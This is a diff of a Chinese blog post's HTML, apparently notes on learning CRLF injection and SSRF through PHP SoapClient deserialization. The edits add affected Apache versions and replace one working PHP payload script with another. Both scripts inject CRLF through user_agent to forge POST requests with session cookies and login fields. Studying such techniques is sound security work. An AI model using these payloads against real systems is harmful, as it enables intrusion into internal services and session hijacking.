@@ -133,7 +133,7 @@
 <meta property="og:site_name" content="gtfly">
 <meta property="og:description" content="CRLFCRLF指的是回车符(CR，\r，%0d)和换行符(LF，\n，%0a)：">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-14T14:18:13.340Z">
+<meta property="og:updated_time" content="2019-08-28T13:13:05.714Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CRLF &amp;&amp; SOAP学习">
 <meta name="twitter:description" content="CRLFCRLF指的是回车符(CR，\r，%0d)和换行符(LF，\n，%0a)：">
@@ -413,8 +413,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-14T22:18:13+08:00">
-                2019-08-14
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-28T21:13:05+08:00">
+                2019-08-28
               </time>
             
           </span>
@@ -473,7 +473,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.6k 字
+                  1.7k 字
                 </span>
               
 
@@ -546,7 +546,9 @@ Content-Length: 226
 Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8</code></pre><p>那么此时便产生了CRLF漏洞，上述产生的漏洞属于<code>固定会话漏洞</code>；当注入两个CRLF时，便能控制返回给浏览器的主体内容</p>
-<h3 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h3><p>Web Services提供一个建立分布式应用的平台，使得运行在不同操作系统和不同设备上的软件，或者用不同程序语言和不同厂商的软件开发工具开发的软件，所有可能的已开发和部署的软件，能够利用这一平台实现分布式计算的目的。最基本的 Web Services是基于 XML 和 HTTP 的</p>
+<p>受CRLF影响的Apache系统版本：</p>
+<pre><code>Apache Group HTTP Server 2.4.1-2.4.23
+Apache Group HTTP Server 2.2.0-2.2.31</code></pre><h3 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h3><p>Web Services提供一个建立分布式应用的平台，使得运行在不同操作系统和不同设备上的软件，或者用不同程序语言和不同厂商的软件开发工具开发的软件，所有可能的已开发和部署的软件，能够利用这一平台实现分布式计算的目的。最基本的 Web Services是基于 XML 和 HTTP 的</p>
 <p>WebService三要素：</p>
 <ul>
 <li><p>SOAP</p>
@@ -594,19 +596,19 @@ Content-Type: text/html; charset=UTF-8</code></pre><p>那么此时便产生了CR
 <li>SoapParam</li>
 <li>SoapVar</li>
 </ul>
-<p>其中，前三个类是高级类，后三个类除了构造器外没有其他别的方法，属于低级类;重点要学习<code>SoapClient</code>这个类</p>
+<p>其中，前三个类是高级类，后三个类除了构造器外没有其他别的方法，属于低级类;我们重点来学习<code>SoapClient</code>这个类</p>
 <h4 id="利用SoapClient从反序列化产生SSRF"><a href="#利用SoapClient从反序列化产生SSRF" class="headerlink" title="利用SoapClient从反序列化产生SSRF"></a>利用SoapClient从反序列化产生SSRF</h4><p>查看PHP手册：</p>
 <blockquote>The SoapClient class provides a client for [» SOAP 1.1](http://www.w3.org/TR/soap11/), [» SOAP 1.2](http://www.w3.org/TR/soap12/) servers. It can be used in WSDL
 or non-WSDL mode.</blockquote><br>
 
-<p>查看该类内置方法，可以看到有个<code>__construct</code>，查看描述：<code>此函数是该函数的别名： SoapClient::SoapClient()</code>，那么继续查看<code>SoapClient::SoapClient()</code></p>
+<p>查看该类内置方法，可以看到有个<code>__construct()</code>，此方法是 <code>SoapClient::SoapClient()</code>的别名，那么继续查看<code>SoapClient::SoapClient()</code></p>
 <p>用法：</p>
 <pre><code>public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )</code></pre><p>参数说明：</p>
 <ul>
 <li>wsdl：URI of the WSDL file or NULL if working in non-WSDL mode.</li>
 <li>options：An array of options. If working in WSDL mode, this parameter is optional.If working in non-WSDL mode, the location and uri options must be set, where location is the URL of the SOAP server to send the request to, and uri is the target namespace of the SOAP service.       </li>
 </ul>
-<p>如果是wsdl模式,在序列化之前就会对options中的url进行请求;如果是非wsdl模式,反序列化的时候会对options的url进行请求</p>
+<p>还有个内置方法<code>__call</code>，当反序列化SoapClient(non-WSDL mode)对象后，调用一个不存在的方法即可触发<code>__call()</code>达到SSRF的目的</p>
 <p>在本地进行简单测试(已开启soap扩展),首先生成SoapClient对象序列化后的字符串:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">'http://101.132.41.135:666'</span>, <span class="string">'uri'</span> =&gt; <span class="string">'123'</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
 
@@ -633,7 +635,7 @@ root@iZuf6dyvi0xivm756htjv6Z:~# </code></pre><h3 id="利用SoapClient从反序�
 <pre><code>The user_agent option specifies string to use in User-Agent header. </code></pre><p>既然可以构造user-agent，那么就可以进行CRLF：</p>
 <p>要POST数据就要使得<code>Content-Type</code>为<code>application/x-www-form-urlencoded</code>，但是不能将原有的<code>Content-Type: text/xml;</code>覆盖掉；但可以发现<code>User-Agent</code>是在<code>Content-Type</code>前面的，因此可以控制<code>User-Agent</code>来控制<code>Content-Type</code>，通过控制<code>Content-Length</code>来控制Body部分</p>
 <p>相关脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1:666'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$location = <span class="string">"http://127.0.0.1/index.php?action=login"</span>;</span><br><span class="line">$uri = <span class="string">"http://127.0.0.1/"</span>;</span><br><span class="line">$event = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: PHPSESSID=8fgr7r5ul750ad13slbuqiqsa6\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&amp;password=jaivypassword&amp;code=10094305&amp;"</span>,<span class="string">'location'</span>=&gt;$location,<span class="string">'uri'</span>=&gt;$uri));</span><br><span class="line">$c = (serialize($event));</span><br><span class="line"><span class="keyword">echo</span> bin2hex($c);</span><br></pre></td></tr></table></figure>
 
 <p>便可通过此方式构造POST请求去探测内网</p>
 <hr>
@@ -813,7 +815,7 @@ root@iZuf6dyvi0xivm756htjv6Z:~# </code></pre><h3 id="利用SoapClient从反序�
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-count">167</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -824,7 +826,7 @@ root@iZuf6dyvi0xivm756htjv6Z:~# </code></pre><h3 id="利用SoapClient从反序�
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
